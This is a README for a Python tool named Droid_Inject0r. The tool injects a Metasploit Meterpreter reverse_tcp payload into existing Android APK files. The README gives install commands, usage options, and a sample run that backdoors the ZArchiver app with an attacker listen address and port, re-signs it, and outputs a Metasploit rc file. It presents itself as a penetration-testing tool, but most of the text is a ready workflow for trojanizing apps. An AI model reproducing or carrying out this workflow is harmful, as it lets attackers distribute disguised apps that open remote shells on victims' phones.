# Droid_Inject0r

Droid_Inject0r is a Python script to inject existing Android applications with a Meterpreter payload. It can be used during penetrating testing or security assessments.


[![asciicast](https://asciinema.org/a/ajlfaPCAmWbWT4Ie0GDmLshjy.png)](https://asciinema.org/a/ajlfaPCAmWbWT4Ie0GDmLshjy)

```
    [+] AUTOR:        Yasser Janah
    [+] GITHUB:       https://github.com/Y4SS3R005
    [+] TWITTER:      https://twitter.com/yasser_janah
    [+] FACEBOOK:     https://fb.com/yasser.janah
```
# Getting the code

Firstly get the code:
```
git clone https://github.com/Y4SS3R005/Droid_Inject0r.git
cd Droid_Inject0r/
chmod +x install_requirements.sh
./install_requirements.sh
```
# Usage

```
Usage: python2 Droid_apk_Inject0r.py -p [PAYLOAD] --lhost=[LHOST] --lport=[PORT] --apkfile=[APKFILE]
    << Coded by : Yasser Janah >>
    << Facebook : https://facebook.com/yasser.janah >>
    << Twitter  : https://twitter.com/yasser_janah >>
    << Github   : https://github.com/Y4SS3R005/ >>
    -p  , --payload        a metasploit android payload (e.x android/meterpreter/reverse_tcp) (not required)
    -lh , --lhost          The listen address (not required)
    -lp , --lport          The listen port (default 4444)
    -ap , --apkfile        path of apkfile (required!!)
```

# Need just select the apkfile 
```
$ ./Droid_apk_Inject0r.py --apkfile zarchiver0-8-3.apk

[*] payload not selected .. default 'android/meterpreter/reverse_tcp'
[*] LHOST not selected .. using '192.168.43.230'
[*] LPORT not selected .. using '4444'
[+] Generating payload:  Generated.
[+] Decompling payload:  Decompiled.
[+] Decompling 'zarchiver0-8-3.apk':  Decompiled.
[+] Copying payload files into 'zarchiver0-8-3.apk':  Done.
[*] Parsing AndroidManifest file
[*] Activity PATH : 'ru/zdevs/zarchiver'
[*] SMALI File    : 'ZArchiver.smali'
[+] Injecting payload into 'zarchiver0-8-3.apk':  Injected.
[+] Get Permissions from payload AndroidManifest file:  Done.
[+] Add Permissions into 'zarchiver0-8-3.apk' AndroidManifest file:  Permissions Added.
[+] Recompling 'zarchiver0-8-3.apk':  Recompiled.
[+] Signing 'zarchiver0-8-3.apk':  Signed.

[+] metasploit rc file : '/home/mcsc/Droid_Inject0r/droid_apk.rc'

[+] final apk : '/home/mcsc/Droid_Inject0r/zarchiver0-8-3-final.apk'

```
